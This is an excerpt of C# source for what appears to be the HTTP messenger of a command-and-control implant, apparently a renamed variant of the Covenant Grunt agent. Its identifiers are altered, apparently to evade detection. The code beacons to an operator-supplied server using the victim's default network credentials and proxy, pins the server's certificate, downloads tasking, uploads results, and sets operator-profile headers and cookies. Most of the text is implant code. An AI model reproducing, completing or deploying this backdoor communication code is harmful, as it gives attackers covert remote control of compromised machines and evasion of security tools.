...
namespace BruteExecutor
{
    class Brute
    {
        public static void Execute(string EasyPeasyURI, string EasyPeasyCertHash, string ANOTHERID, Aes SessKEy)
        {
            try
            {
                ...
                bAsemEsSenger = new HttpMessenger(EasyPeasyURI, EasyPeasyCertHash, UsCertPin, ValCerT, ProfHTTPHeaderNames, ProfHTTPHeaderValues, ProfHTTPUrls);
                bAsemEsSenger.Read();
    ...
    public class HttpMessenger : IMessenger
    {
        ...
        private string EasyPeasyURI { get; }
        private GrawlsWebClient EasyPeasyClient { get; set; } = new GrawlsWebClient();
        ...
        public HttpMessenger(string EasyPeasyURI, string EasyPeasyCertHash, bool UsCertPin, bool ValCerT, List<string> ProfHTTPHeaderNames, List<string> ProfHTTPHeaderValues, List<string> ProfHTTPUrls)
        {
            this.EasyPeasyURI = EasyPeasyURI;
            this.Hostname = EasyPeasyURI.Split(':')[1].Split('/')[2];
            this.ProfHTTPHeaderNames = ProfHTTPHeaderNames;
            this.ProfHTTPHeaderValues = ProfHTTPHeaderValues;
            this.ProfHTTPUrls = ProfHTTPUrls;

            this.EasyPeasyClient.UseDefaultCredentials = true;
            this.EasyPeasyClient.Proxy = WebRequest.DefaultWebProxy;
            this.EasyPeasyClient.Proxy.Credentials = CredentialCache.DefaultNetworkCredentials;
            ...
            {
                bool valid = true;
                if (this.UsCertPin && EasyPeasyCertHash != "")
                {
                    valid = cert.GetCertHashString() == EasyPeasyCertHash;
                }
        ...
        public ProfileMessage Read()
        {
            ...
            lock (this._WebClientLock)
            {
                ...
                return new ProfileMessage { Type = MessageType.Read, Message = this.EasyPeasyClient.DownloadString(this.EasyPeasyURI + this.GetURL()) };
            }
        }
        ...
        public void Write(string Message)
        {
            ...
            {
                this.SetupGrawlsWebClient();
                ProfileMessage ToReadMessage = new ProfileMessage { Type = MessageType.Write, Message = this.EasyPeasyClient.UploadString(this.EasyPeasyURI + this.GetURL(), Message) };
        ...
        private void SetupGrawlsWebClient()
        {
            for (int i = 0; i < ProfHTTPHeaderValues.Count; i++)
            {
                ...
                {
                    this.EasyPeasyClient.SetCookies(new Uri(this.EasyPeasyURI), ProfHTTPHeaderValues[i].Replace(";", ",").Replace("{ANOTHERID}", this.Identifier));
                }
                else
                {
                    this.EasyPeasyClient.Headers.Set(ProfHTTPHeaderNames[i].Replace("{ANOTHERID}", this.Identifier), ProfHTTPHeaderValues[i].Replace("{ANOTHERID}", this.Identifier));
                }
            }
        }
    }
